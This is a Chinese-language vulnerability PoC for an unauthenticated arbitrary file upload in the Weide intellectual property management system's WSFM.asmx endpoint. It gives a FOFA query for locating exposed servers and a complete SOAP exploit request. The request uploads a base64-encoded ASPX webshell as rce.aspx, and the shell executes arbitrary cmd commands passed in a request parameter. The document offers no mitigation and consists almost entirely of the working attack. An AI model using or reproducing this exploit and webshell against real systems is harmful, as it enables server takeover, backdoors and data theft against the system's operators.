# 唯徳知识产权管理系统WSFM.asmx接口存在任意文件上传漏洞

唯徳知识产权管理系统 /AutoUpdate/WSFM.asmx 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```javascript
body="JSCOMM/language.js"
```

## poc

```javascript
POST /AutoUpdate/WSFM.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/UploadFileWordTemplate"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <UploadFileWordTemplate xmlns="http://tempuri.org/">
      <fileByteArray>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiIHZhbGlkYXRlUmVxdWVzdD0iZmFsc2UiICU+CjwlCnZhciBjPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbygiY21kIik7CnZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpOwp2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjsKYy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7CmMuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlOwpjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlOwplLlN0YXJ0SW5mbz1jOwpjLkFyZ3VtZW50cz0iL2MgIiArIFJlcXVlc3QuSXRlbVsiY21kIl07CmUuU3RhcnQoKTsKb3V0PWUuU3RhbmRhcmRPdXRwdXQ7CkVJPWUuU3RhbmRhcmRFcnJvcjsKZS5DbG9zZSgpOwpSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7ClN5c3RlbS5JTy5GaWxlLkRlbGV0ZShSZXF1ZXN0LlBoeXNpY2FsUGF0aCk7ClJlc3BvbnNlLkVuZCgpOyU+</fileByteArray>
      <remotePath>/TemplateFiles/rce.aspx</remotePath>
    </UploadFileWordTemplate>
  </soap:Body>
</soap:Envelope>
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409141637528.png)



文件路径：`\TemplateFiles\rce.aspx`